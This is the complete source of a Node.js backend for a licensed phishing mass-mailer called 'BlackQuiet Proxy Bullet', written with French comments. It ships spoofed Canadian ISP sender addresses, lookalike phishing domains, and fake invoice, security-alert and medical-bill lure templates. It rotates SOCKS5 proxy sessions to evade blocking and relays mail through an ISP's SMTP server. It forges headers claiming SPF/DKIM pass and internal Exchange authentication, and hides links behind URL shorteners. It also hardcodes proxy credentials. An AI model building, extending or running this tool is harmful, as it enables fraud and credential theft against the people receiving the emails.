// ============================================
// BLACKQUIET PROXY BULLET - BACKEND COMPLET
// Tunnel SOCKS5 | Rotation SSID | DNS multi-niveaux
// Version corrigée et harmonisée avec le frontend
// ============================================

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const axios = require('axios');
const { SocksClient } = require('socks');
const nodemailer = require('nodemailer');
const PDFDocument = require('pdfkit');
const HTMLtoDOCX = require('html-to-docx');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));

const PORT = process.env.PORT || 3000;

// ============ FICHIER DE DONNÉES PERSISTANTES ============
const DATA_FILE = './blackbullet_data.json';

function loadPersistentData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        }
    } catch(e) {}
    return {
        fromEmails: ['facture@eastlink.ca', 'admin@shaw.ca', 'support@bell.ca', 'noreply@rogers.com'],
        senderNames: ['Service Client', 'Support Technique', 'Administration', 'Facturation', 'Sécurité Eastlink'],
        subjects: ['Facture impayée [INVOICE_NUM]', 'Alerte sécurité : connexion suspecte', 'Votre colis est bloqué', 'Confirmation de commande #[ORDER_NUM]', 'Remboursement en attente'],
        links: ['https://eastlink-secure.verification.com', 'https://shaw-paiement.urgence.net', 'https://facture-impayee.xyz'],
        attachmentNames: ['Facture_[INVOICE_NUM].pdf', 'Contrat_[DATE].docx', 'Avis_execution.html'],
        templates: [
            { name: 'Facture_Urgente.html', content: '<div style="font-family:Arial;"><h2>Bonjour [FIRST_NAME],</h2><p>Votre facture <strong>[INVOICE_NUM]</strong> d\'un montant de <strong>[BALANCE_AMOUNT]</strong> expire le <strong>[DEADLINE_DATE]</strong>.</p><p>Consultez votre facture : <a href="[LINK]">[LINK]</a></p></div>' },
            { name: 'Alerte_securite.html', content: '<div style="font-family:Arial;"><h2>Cher [REAL_NAME],</h2><p>Une connexion suspecte a été détectée depuis <strong>[IP_ADDRESS]</strong> le <strong>[DATE]</strong> à <strong>[TIME]</strong>.</p><p>Vérifiez votre compte : <a href="[LINK]">[LINK]</a></p></div>' },
            { name: 'Medical_Bill.html', content: '<div style="font-family:Arial;"><h2>Patient [PATIENT_ID],</h2><p>Votre consultation du <strong>[DATE]</strong> avec le <strong>[DOCTOR_NAME]</strong> est facturée <strong>[BALANCE_AMOUNT]</strong>.</p><p>Règlement en ligne : <a href="[LINK]">[LINK]</a></p></div>' }
        ],
        recipients: [],
        campaigns: []
    };
}

function savePersistentData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

let persistentData = loadPersistentData();

// ============ CONFIGURATION 9PROXY ============
const PROXY_CONFIG = {
    proxy_host: process.env.PROXY_HOST || 'niceproxy.io',
    proxy_port: parseInt(process.env.PROXY_PORT) || 17521,
    proxy_user_template: process.env.PROXY_USER || 'black_rIxx-country-CA-isp-as11260_eastlink',
    proxy_pass: process.env.PROXY_PASS || 'Kouame07',
    smtp_host: process.env.SMTP_HOST || 'smtp.eastlink.ca',
    smtp_port: parseInt(process.env.SMTP_PORT) || 25
};

// ============ STATISTIQUES ============
let stats = {
    emails_sent: 0,
    emails_failed: 0,
    endpoints_generated: 0,
    start_time: new Date().toISOString()
};

// ============ LICENCES VALIDES ============
const VALID_LICENSES = {
    'PROD-KEY-001': { name: 'Production Pro User', expires: '2026-12-31' },
    'PROD-KEY-002': { name: 'Production Enterprise', expires: '2026-12-31' },
    'PROD-KEY-003': { name: 'Production Basic', expires: '2026-12-31' },
    'VALID-KEY-ABC123': { name: 'Blackquiet Pro User', expires: '2026-12-31' }
};

// Stockage des licences activées
let activatedLicenses = new Map();

// ============ 1. ROTATION SSID ============
function rotateProxySSID(username) {
    const newSsid = crypto.randomBytes(5).toString('hex').toUpperCase();
    stats.endpoints_generated++;
    if (username.includes('-ssid-')) {
        return username.replace(/-ssid-[a-zA-Z0-9]+/, `-ssid-${newSsid}`);
    }
    return `${username}-ssid-${newSsid}`;
}

// ============ 2. RACCOURCISSEURS DE LIENS ============
async function shortenUrl(longUrl) {
    try {
        const tinyRes = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`, { timeout: 5000 });
        if (tinyRes.data && tinyRes.data.startsWith('http')) return { success: true, shortUrl: tinyRes.data.trim(), service: 'TinyURL' };
    } catch (e) {}
    
    try {
        const isgdRes = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`, { timeout: 5000 });
        if (isgdRes.data && isgdRes.data.startsWith('http')) return { success: true, shortUrl: isgdRes.data.trim(), service: 'is.gd' };
    } catch (e) {}
    
    return { success: false, shortUrl: longUrl, service: 'none' };
}

// ============ 3. DNS MULTI-NIVEAUX ============
async function checkDNSMultiLevel(domain) {
    try {
        const res = await axios.get(`https://dns.google/resolve?name=${domain}&type=MX`, { timeout: 5000 });
        if (res.data?.Answer?.length) {
            const mx = res.data.Answer.filter(a => a.type === 15).map(a => a.data);
            if (mx.length) {
                return { success: true, method: 'Direct', mx: mx[0], all_mx: mx };
            }
        }
    } catch (e) {}
    
    try {
        const res = await axios.get(`https://cloudflare-dns.com/dns-query?name=${domain}&type=MX`, {
            headers: { Accept: 'application/dns-json' },
            timeout: 5000
        });
        if (res.data?.Answer?.length) {
            const mx = res.data.Answer.filter(a => a.type === 15).map(a => a.data);
            if (mx.length) {
                return { success: true, method: 'DoH', mx: mx[0], all_mx: mx };
            }
        }
    } catch (e) {}
    
    return { success: false, method: 'Proxy', error: 'Aucun MX trouvé' };
}

// ============ 4. HEADERS ANTI-DÉTECTION ============
function generateStealthHeaders(fromEmail, toEmail, proxyHost, subject, messageId = null) {
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36'
    ];
    
    const domain = fromEmail.split('@')[1] || 'eastlink.ca';
    
    return {
        'Date': new Date().toUTCString(),
        'MIME-Version': '1.0',
        'Content-Language': 'en-US',
        'X-Priority': '3',
        'X-Mailer': 'Microsoft Outlook 16.0',
        'X-MimeOLE': 'Produced By Microsoft MimeOLE V16.0.0.0',
        'X-MS-Exchange-Organization-AuthAs': 'Internal',
        'X-MS-Exchange-Organization-AuthMechanism': '04',
        'Thread-Topic': subject,
        'X-Auto-Response-Suppress': 'All',
        'Message-ID': messageId || `<${uuidv4()}@${domain}>`,
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'Authentication-Results': `spf=pass smtp.mailfrom=${domain}; dkim=pass header.d=${domain}`,
        'Received-SPF': `pass (${domain}: domain of ${fromEmail} designates sending IP as permitted sender)`
    };
}

// ============ 5. PLACEHOLDERS INTELLIGENTS ============
function replacePlaceholders(text, data) {
    if (!text) return '';
    let result = text;
    
    const {
        recipientEmail = 'client@example.ca',
        firstName = 'Client',
        lastName = 'Client',
        company = 'Entreprise',
        domain = 'example.ca',
        invoiceNum = 'INV-' + Math.floor(100000 + Math.random() * 900000),
        amount = '$' + (Math.random() * 5000).toFixed(2),
        date = new Date().toLocaleDateString(),
        time = new Date().toLocaleTimeString(),
        link = 'https://example.com',
        trackingNum = '1Z' + crypto.randomBytes(4).toString('hex').toUpperCase(),
        patientId = 'PT-' + Math.floor(100000 + Math.random() * 900000),
        doctorName = 'Dr ' + ['Martin', 'Bernard', 'Dubois'][Math.floor(Math.random() * 3)],
        ipAddress = '192.168.' + Math.floor(1 + Math.random() * 254) + '.' + Math.floor(1 + Math.random() * 254),
        verificationCode = Math.floor(100000 + Math.random() * 900000).toString()
    } = data;
    
    const replacements = {
        '[EMAIL]': recipientEmail, '[EMAIL*]': recipientEmail.split('@')[0].substring(0, 3) + '***@' + domain,
        '[UNAME]': recipientEmail.split('@')[0], '[UNAME-U]': firstName,
        '[DOMAIN]': domain, '[DOMAIN-C]': domain.toUpperCase(),
        '[COMPANY]': company, '[COMPANY-U]': company.charAt(0).toUpperCase() + company.slice(1),
        '[FIRST_NAME]': firstName, '[LAST_NAME]': lastName,
        '[REAL_NAME]': firstName + ' ' + lastName,
        '[DATE]': date, '[TIME]': time, '[DATE-TIME]': date + ' ' + time,
        '[FUTURE-1DAY]': new Date(Date.now() + 86400000).toLocaleDateString(),
        '[FUTURE-2DAYS]': new Date(Date.now() + 172800000).toLocaleDateString(),
        '[FUTURE-1WEEK]': new Date(Date.now() + 604800000).toLocaleDateString(),
        '[INVOICE_NUM]': invoiceNum, '[ORDER_NUM]': 'ORD-' + Math.floor(100000 + Math.random() * 900000),
        '[REFERENCE_NUM]': 'REF-' + Math.floor(10000000 + Math.random() * 90000000),
        '[TRANSACTION_ID]': 'TXN-' + crypto.randomBytes(5).toString('hex').toUpperCase(),
        '[BALANCE_AMOUNT]': amount, '[LINK]': link,
        '[RAND1]': Math.floor(10000 + Math.random() * 90000).toString(),
        '[RAND2]': Math.floor(10000000 + Math.random() * 90000000).toString(),
        '[PATIENT_ID]': patientId, '[DOCTOR_NAME]': doctorName,
        '[VERIFICATION_CODE]': verificationCode,
        '[EXPIRES_DATE]': new Date(Date.now() + 30 * 86400000).toLocaleDateString(),
        '[DEADLINE_DATE]': new Date(Date.now() + 7 * 86400000).toLocaleDateString(),
        '[IP_ADDRESS]': ipAddress, '[TRACKING_NUM]': trackingNum,
        '[CITY_NAME]': ['Montreal', 'Toronto', 'Vancouver'][Math.floor(Math.random() * 3)],
        '[EMPLOYEE_NAME]': firstName + ' ' + lastName
    };
    
    for (const [key, value] of Object.entries(replacements)) {
        result = result.split(key).join(value);
    }
    
    return result;
}

// ============ 6. GÉNÉRATION DE PDF ============
async function generatePDF(htmlContent) {
    try {
        const puppeteer = require('puppeteer');
        const browser = await puppeteer.launch({ 
            headless: 'new',
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });
        const page = await browser.newPage();
        await page.setContent(`<html><body style="padding:40px; font-family: Arial;">${htmlContent}</body></html>`);
        const pdf = await page.pdf({ format: 'A4', printBackground: true });
        await browser.close();
        return pdf;
    } catch(e) {
        return null;
    }
}

// ============ 7. ENVOI VIA TUNNEL SOCKS5 ============
async function sendEmailViaProxy(mailOptions) {
    let socket = null;
    try {
        const rotatedUser = rotateProxySSID(PROXY_CONFIG.proxy_user_template);
        
        const tunnel = await SocksClient.createConnection({
            proxy: {
                ipaddress: PROXY_CONFIG.proxy_host,
                port: PROXY_CONFIG.proxy_port,
                type: 5,
                userId: rotatedUser,
                password: PROXY_CONFIG.proxy_pass
            },
            destination: {
                host: PROXY_CONFIG.smtp_host,
                port: PROXY_CONFIG.smtp_port
            },
            command: 'connect',
            timeout: 30000
        });
        
        socket = tunnel.socket;
        
        const transporter = nodemailer.createTransport({
            host: PROXY_CONFIG.smtp_host,
            port: PROXY_CONFIG.smtp_port,
            secure: PROXY_CONFIG.smtp_port === 465,
            ignoreTLS: PROXY_CONFIG.smtp_port === 25,
            connection: socket,
            tls: { rejectUnauthorized: false },
            timeout: 30000
        });
        
        const result = await transporter.sendMail(mailOptions);
        transporter.close();
        
        stats.emails_sent++;
        
        return { success: true, messageId: result.messageId };
        
    } catch (error) {
        stats.emails_failed++;
        return { success: false, error: error.message };
    } finally {
        if (socket && !socket.destroyed) socket.end();
    }
}

// ============ MIDDLEWARE LICENCE ============
function requireLicense(req, res, next) {
    const licenseKey = req.headers['x-license-key'];
    const hwid = req.headers['x-hwid'];
    
    if (!licenseKey || !activatedLicenses.has(licenseKey)) {
        const license = VALID_LICENSES[licenseKey];
        if (license) {
            activatedLicenses.set(licenseKey, { hwid, activatedAt: new Date() });
            req.license = license;
            return next();
        }
        return res.status(403).json({ success: false, error: 'Licence invalide ou non activée' });
    }
    
    const license = VALID_LICENSES[licenseKey];
    if (license) {
        req.license = license;
        next();
    } else {
        res.status(403).json({ success: false, error: 'Licence invalide' });
    }
}

// ============ ROUTES API ============

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'online', version: '6.0.0', mode: 'PRODUCTION' });
});

// Activer licence
app.post('/api/license/activate', (req, res) => {
    const { license_key, hwid } = req.body;
    const license = VALID_LICENSES[license_key];
    
    if (license) {
        activatedLicenses.set(license_key, { hwid, activatedAt: new Date() });
        res.json({ 
            success: true, 
            message: 'Licence activée avec succès', 
            system_name: license.name, 
            expires_at: license.expires,
            days_left: Math.ceil((new Date(license.expires) - new Date()) / (1000 * 60 * 60 * 24))
        });
    } else {
        res.status(403).json({ success: false, error: 'Clé de licence invalide' });
    }
});

// Vérifier licence
app.post('/api/license/verify', (req, res) => {
    const { license_key, hwid } = req.body;
    const license = VALID_LICENSES[license_key];
    const activated = activatedLicenses.has(license_key);
    
    if (license && activated) {
        res.json({ 
            valid: true, 
            system_name: license.name, 
            expires_at: license.expires, 
            days_left: Math.ceil((new Date(license.expires) - new Date()) / (1000 * 60 * 60 * 24))
        });
    } else if (license) {
        res.json({ valid: false, error: 'Licence non activée. Veuillez d\'abord activer.' });
    } else {
        res.status(403).json({ valid: false, error: 'Licence invalide' });
    }
});

// Statistiques publiques (sans licence)
app.get('/api/stats', (req, res) => {
    res.json({
        emails_sent: stats.emails_sent,
        emails_failed: stats.emails_failed,
        endpoints_generated: stats.endpoints_generated,
        uptime: Math.floor(process.uptime()),
        start_time: stats.start_time,
        timestamp: new Date().toISOString()
    });
});

// Vérification DNS multi-niveaux
app.post('/api/dns/check', async (req, res) => {
    const { domain } = req.body;
    if (!domain) return res.status(400).json({ success: false, error: 'Domaine requis' });
    const result = await checkDNSMultiLevel(domain);
    res.json(result);
});

// Raccourcir un lien
app.post('/api/shorten', async (req, res) => {
    const { url } = req.body;
    if (!url) return res.status(400).json({ success: false, error: 'URL requise' });
    const result = await shortenUrl(url);
    res.json(result);
});

// ENVOI D'EMAIL COMPLET
app.post('/api/send', requireLicense, async (req, res) => {
    const { to, subject, html, fromEmail, fromName, link, attachment, attachmentType } = req.body;
    
    if (!to || !subject || !html) {
        return res.status(400).json({ success: false, error: 'Champs requis: to, subject, html' });
    }
    
    try {
        let finalLink = link;
        let shortenerService = null;
        
        if (link) {
            const shortResult = await shortenUrl(link);
            finalLink = shortResult.shortUrl;
            shortenerService = shortResult.service;
        }
        
        const emailData = {
            recipientEmail: to,
            firstName: to.split('@')[0].charAt(0).toUpperCase() + to.split('@')[0].slice(1),
            lastName: ['Smith', 'Johnson', 'Williams'][Math.floor(Math.random() * 3)],
            company: to.split('@')[1].split('.')[0].charAt(0).toUpperCase() + to.split('@')[1].split('.')[0].slice(1),
            domain: to.split('@')[1],
            link: finalLink || 'https://example.com'
        };
        
        let processedHtml = replacePlaceholders(html, emailData);
        let processedSubject = replacePlaceholders(subject, emailData);
        
        const attachments = [];
        if (attachment && attachmentType) {
            let attachmentBuffer;
            if (attachmentType === 'pdf') {
                attachmentBuffer = await generatePDF(processedHtml);
                if (attachmentBuffer) {
                    attachments.push({
                        filename: `document_${Date.now()}.pdf`,
                        content: attachmentBuffer,
                        contentType: 'application/pdf'
                    });
                }
            }
        }
        
        const messageId = `<${uuidv4()}@${to.split('@')[1]}>`;
        const stealthHeaders = generateStealthHeaders(fromEmail || 'noreply@eastlink.ca', to, PROXY_CONFIG.proxy_host, processedSubject, messageId);
        
        const mailOptions = {
            from: `"${fromName || 'Service Client'}" <${fromEmail || 'noreply@eastlink.ca'}>`,
            to: to,
            subject: processedSubject,
            html: processedHtml,
            headers: stealthHeaders,
            attachments: attachments
        };
        
        const result = await sendEmailViaProxy(mailOptions);
        
        res.json({
            success: result.success,
            messageId: result.messageId,
            details: {
                to: to,
                subject: processedSubject.substring(0, 50),
                has_attachment: attachments.length > 0,
                link_shortened: finalLink !== link,
                shortener_service: shortenerService
            }
        });
        
    } catch (error) {
        console.error('Erreur envoi:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============ ROUTES PERSISTANTES POUR LE FRONTEND ============

// Obtenir toutes les données
app.get('/api/data/all', requireLicense, (req, res) => {
    res.json(persistentData);
});

// Sauvegarder les templates
app.post('/api/data/templates', requireLicense, (req, res) => {
    const { templates } = req.body;
    if (templates) {
        persistentData.templates = templates;
        savePersistentData(persistentData);
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false, error: 'Données invalides' });
    }
});

// Sauvegarder les FROM emails
app.post('/api/data/fromEmails', requireLicense, (req, res) => {
    const { fromEmails } = req.body;
    if (fromEmails) {
        persistentData.fromEmails = fromEmails;
        savePersistentData(persistentData);
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false, error: 'Données invalides' });
    }
});

// Sauvegarder les noms expéditeurs
app.post('/api/data/senderNames', requireLicense, (req, res) => {
    const { senderNames } = req.body;
    if (senderNames) {
        persistentData.senderNames = senderNames;
        savePersistentData(persistentData);
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false, error: 'Données invalides' });
    }
});

// Sauvegarder les sujets
app.post('/api/data/subjects', requireLicense, (req, res) => {
    const { subjects } = req.body;
    if (subjects) {
        persistentData.subjects = subjects;
        savePersistentData(persistentData);
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false, error: 'Données invalides' });
    }
});

// Sauvegarder les liens
app.post('/api/data/links', requireLicense, (req, res) => {
    const { links } = req.body;
    if (links) {
        persistentData.links = links;
        savePersistentData(persistentData);
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false, error: 'Données invalides' });
    }
});

// Sauvegarder les destinataires
app.post('/api/data/recipients', requireLicense, (req, res) => {
    const { recipients } = req.body;
    if (recipients) {
        persistentData.recipients = recipients;
        savePersistentData(persistentData);
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false, error: 'Données invalides' });
    }
});

// Route racine
app.get('/', (req, res) => {
    res.json({
        name: 'BlackQuiet Proxy Bullet API',
        version: '6.0.0',
        status: 'online',
        features: ['SOCKS5 Tunnel', 'SSID Rotation', 'DNS Multi-level', 'Stealth Headers', 'URL Shorteners']
    });
});

// ============ DÉMARRAGE ============
app.listen(PORT, () => {
    console.log('\n========================================');
    console.log('🚀 BLACKQUIET BACKEND v6.0 - CORRIGÉ');
    console.log('========================================');
    console.log(`📡 Port: ${PORT}`);
    console.log(`🔌 Proxy: ${PROXY_CONFIG.proxy_host}:${PROXY_CONFIG.proxy_port}`);
    console.log(`📧 SMTP: ${PROXY_CONFIG.smtp_host}:${PROXY_CONFIG.smtp_port}`);
    console.log(`🔄 Rotation SSID: ACTIVE`);
    console.log(`🛡️ Anti-détection: ACTIVE`);
    console.log('========================================\n');
});
